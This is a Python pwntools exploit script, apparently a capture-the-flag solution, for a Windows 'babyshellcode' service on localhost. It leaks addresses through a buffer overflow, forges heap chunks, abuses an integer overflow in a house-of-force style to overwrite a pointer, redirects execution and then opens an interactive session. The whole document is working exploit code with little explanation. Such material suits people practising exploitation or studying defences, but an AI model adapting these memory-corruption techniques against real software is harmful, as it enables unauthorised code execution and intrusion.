from pwn import *
from time import sleep
import ctypes
context.log_level = "info"
context.bits = 32

def add(sc):
    io.sendlineafter("Option:\r\n", '1')
    io.sendlineafter("shellcode size:\r\n", str(len(sc)))
    io.sendlineafter("shellcode name:\r\n", "name")
    io.sendlineafter("shellcode description:\r\n", "desc")
    io.sendlineafter("shellcode:\r\n", sc)

def show():
    io.sendlineafter("Option:\r\n", '2')

def delete(idx):
    io.sendlineafter("Option:\r\n", '3')
    io.sendlineafter("shellcode index:\r\n", str(idx))

def run(idx):
    io.sendlineafter("Option:\r\n", '4')
    io.sendlineafter("shellcode index:\r\n", str(idx))

io = remote("127.0.0.1", 1337)

io.recvuntil("Global memory alloc at ")
rwe_heap = int(io.recvuntil("\r\n", drop = True), 16)
success("rwe_heap @ {:#x}".format(rwe_heap))

# bof -> leak babyshellcode.exe@base
io.sendlineafter("leave your name\r\n", 'x' * 28)
io.recvuntil('x' * 28)
bin_base = u32(io.recvuntil("\r\n", drop = True).ljust(4, '\0')) - 0x1afa
success("bin_base @ {:#x}".format(bin_base))
allocsc_iat = bin_base + 0x30f8
success("allocsc@iat @ {:#x}".format(allocsc_iat))
Memory = bin_base + 0x53f8
success("Memory @ {:#x}".format(Memory))

# forge heap
for i in xrange(19):
    add('padding\0')
add(flat(allocsc_iat, allocsc_iat, 0x20, allocsc_iat))

# interger overflow ~= house of force
io.sendlineafter("Option:\r\n", '1')
fake_size = ctypes.c_int(0xffffffff + 1 - rwe_heap - 8 * 19 - 16 + Memory).value
# print("fake_size @ {}".format(fake_size))
assert fake_size < 0, "Try again!"
io.sendlineafter("shellcode size:\r\n", str(fake_size))

delete(10)
delete(12)

# add(flat(rwe_heap + 0x98, rwe_heap + 0x98))
add(flat(rwe_heap + 0x98))
show()
scmgr_base = u32(io.recvn(4)) - 0x1050
success("scmgr_base @ {:#x}".format(scmgr_base))
shellcode_test = scmgr_base + 0x1100
success("shellcode_test @ {:#x}".format(shellcode_test))

# pause()
add(fit({
    0x0: flat(shellcode_test),
    0x4c: flat(0)
}, filler = flat(Memory)))

run(19)

io.interactive()
# io.close()
